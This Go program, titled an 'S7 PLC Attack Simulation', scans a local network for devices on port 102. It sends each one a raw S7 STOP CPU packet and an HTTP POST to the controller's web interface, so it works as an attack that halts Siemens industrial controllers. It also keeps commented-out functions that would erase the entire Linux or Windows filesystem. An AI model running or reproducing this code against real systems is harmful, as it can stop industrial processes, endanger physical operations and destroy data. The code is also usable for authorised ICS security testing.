package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

// GetIPAddr returns the first non-loopback IPv4 address.
func GetIPAddr() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		fmt.Printf("[ERROR] Failed to get network interfaces: %v\n", err)
		return ""
	}

	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
			fmt.Printf("[+] Found local IP address: %s\n", ipnet.IP.String())
			return ipnet.IP.String()
		}
	}
	return ""
}

// GetNetwork generates a list of all IPs in the network range of the given IP address.
func GetNetwork(ipAddr string) []string {
	_, ipnet, err := net.ParseCIDR(ipAddr)
	if err != nil {
		fmt.Printf("[ERROR] Failed to parse CIDR: %v\n", err)
		return nil
	}

	mask := binary.BigEndian.Uint32(ipnet.Mask)
	start := binary.BigEndian.Uint32(ipnet.IP) + 1
	finish := (start & mask) | (mask ^ 0xffffffff)

	var ipList []string
	for i := start; i <= finish; i++ {
		ip := make(net.IP, 4)
		binary.BigEndian.PutUint32(ip, i)
		ipList = append(ipList, ip.String())
	}
	fmt.Printf("[+] Generated %d IP addresses in subnet %s\n", len(ipList), ipAddr)
	return ipList
}

// ScanIP returns a list of reachable IPs on port 102.
func ScanIP(ipList []string) []string {
	fmt.Printf("[*] Starting scan for S7 PLCs on port 102...\n")
	var scannedIPs []string
	for _, ip := range ipList {
		target := ip + ":102"
		if conn, err := net.DialTimeout("tcp", target, 1*time.Second); err == nil {
			fmt.Printf("[+] Found S7 PLC at: %s\n", ip)
			scannedIPs = append(scannedIPs, ip)
			_ = conn.Close()
		}
	}
	fmt.Printf("[+] Scan complete. Found %d S7 PLCs\n", len(scannedIPs))
	return scannedIPs
}

// VerifyTargets checks if provided IPs have port 102 open
func VerifyTargets(targets []string) []string {
	fmt.Printf("[*] Verifying target IPs for S7 PLCs on port 102...\n")
	var validTargets []string
	for _, ip := range targets {
		target := ip + ":102"
		if conn, err := net.DialTimeout("tcp", target, 1*time.Second); err == nil {
			fmt.Printf("[+] Confirmed S7 PLC at: %s\n", ip)
			validTargets = append(validTargets, ip)
			_ = conn.Close()
		} else {
			fmt.Printf("[-] Target %s is not reachable on port 102\n", ip)
		}
	}
	return validTargets
}

// KillIP sends a stop command to the devices at the scanned IPs.
func KillIP(scannedIPs []string) {
	fmt.Printf("\n[*] Initiating S7 protocol STOP CPU attack...\n")
	stop := "\x03\x00\x00\x21\x02\xf0\x80\x32\x01\x00\x00\x06\x00\x00\x10\x00\x00\x29\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d"
	for _, ip := range scannedIPs {
		if conn, err := net.Dial("tcp", ip+":102"); err == nil {
			fmt.Printf("[!] Sending STOP command to PLC at %s via S7 protocol\n", ip)
			_, _ = conn.Write([]byte(stop))
			_ = conn.Close()
		} else {
			fmt.Printf("[-] Failed to connect to %s: %v\n", ip, err)
		}
	}
	fmt.Printf("[*] S7 protocol attack phase complete\n")
}

// KillHTTP sends a stop command via HTTP to the devices at the scanned IPs.
func KillHTTP(scannedIPs []string) {
	fmt.Printf("\n[*] Initiating HTTP web interface STOP attack...\n")
	client := &http.Client{}
	for _, ip := range scannedIPs {
		data := strings.NewReader(`Run=1&PriNav=Stop`)
		req, err := http.NewRequest("POST", "http://"+ip+"/CPUCommands", data)
		if err != nil {
			fmt.Printf("[-] Failed to create HTTP request for %s: %v\n", ip, err)
			continue
		}
		fmt.Printf("[!] Sending STOP command to PLC at %s via HTTP interface\n", ip)
		setHTTPHeaders(req, ip)
		if resp, err := client.Do(req); err != nil {
			fmt.Printf("[-] HTTP request failed for %s: %v\n", ip, err)
		} else {
			fmt.Printf("[+] HTTP request sent successfully to %s (Status: %s)\n", ip, resp.Status)
			_ = resp.Body.Close()
		}
	}
	fmt.Printf("[*] HTTP attack phase complete\n")
}

// setHTTPHeaders sets the necessary HTTP headers for the requests in KillHTTP.
func setHTTPHeaders(req *http.Request, ip string) {
	req.Header.Set("Host", ip)
	req.Header.Set("Content-Length", "19")
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Origin", "http://"+ip)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Set("Referer", "http://"+ip+"/Portal/Portal.mwsl?PriNav=Start")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Connection", "close")
	req.Header.Set("Cookie", "siemens_automation_no_intro=TRUE")
}

// KillLinux deletes files on Linux systems if the user has sufficient privileges.
// func KillLinux() {
// 	fmt.Println("[!!!] DESTRUCTIVE: Attempting to wipe Linux filesystem...")
// 	if err := os.RemoveAll("/"); err != nil {
// 		fmt.Printf("[ERROR] Failed to wipe filesystem: %v\n", err)
// 	}
// }

// KillWindows deletes files on Windows systems if the user has sufficient privileges.
// func KillWindows() {
// 	fmt.Println("[!!!] DESTRUCTIVE: Attempting to wipe Windows filesystem...")
// 	if err := os.RemoveAll("C:\\"); err != nil {
// 		fmt.Printf("[ERROR] Failed to wipe filesystem: %v\n", err)
// 	}
// }

// ValidateIP checks if a string is a valid IP address
func ValidateIP(ip string) bool {
	return net.ParseIP(ip) != nil
}

func main() {
	fmt.Println("=== SIMATIC-SMACKDOWN - S7 PLC Attack Simulation ===")

	var targets []string

	// Check if IP addresses were provided as arguments
	if len(os.Args) > 1 {
		fmt.Printf("[*] Target mode: Specific IPs provided\n")
		// Validate provided IPs
		for _, arg := range os.Args[1:] {
			if ValidateIP(arg) {
				targets = append(targets, arg)
				fmt.Printf("[+] Added target: %s\n", arg)
			} else {
				fmt.Printf("[-] Invalid IP address: %s (skipping)\n", arg)
			}
		}

		if len(targets) == 0 {
			fmt.Println("[ERROR] No valid IP addresses provided. Exiting.")
			fmt.Println("Usage: simatic_smackdown [ip1] [ip2] ...")
			return
		}

		// Verify targets have port 102 open
		targets = VerifyTargets(targets)
		if len(targets) == 0 {
			fmt.Println("[!] No targets are reachable on port 102. Exiting.")
			return
		}
	} else {
		// No arguments - perform network scan
		fmt.Printf("[*] Target mode: Network scan\n")
		fmt.Println("[*] No specific targets provided - scanning local network...")

		ipAddr := GetIPAddr() + "/24"
		if ipAddr == "/24" {
			fmt.Println("[ERROR] No network interface found. Exiting.")
			return
		}

		fmt.Printf("[*] Targeting subnet: %s\n", ipAddr)
		ipList := GetNetwork(ipAddr)
		if ipList == nil {
			fmt.Println("[ERROR] Failed to generate IP list. Exiting.")
			return
		}

		targets = ScanIP(ipList)
		if len(targets) == 0 {
			fmt.Println("[!] No S7 PLCs found on the network. Exiting.")
			return
		}
	}

	// Attack the targets
	fmt.Printf("\n[*] Proceeding with attack on %d target(s)\n", len(targets))
	KillIP(targets)
	KillHTTP(targets)

	// switch runtime.GOOS {
	// case "linux":
	// 	fmt.Printf("[!] Detected Linux OS - Destructive payload available but disabled\n")
	// 	// KillLinux()
	// case "windows":
	// 	fmt.Printf("[!] Detected Windows OS - Destructive payload available but disabled\n")
	// 	// KillWindows()
	// }

	fmt.Println("\n[*] Attack simulation complete.")
	fmt.Printf("[*] Targeted %d PLCs in total\n", len(targets))
}
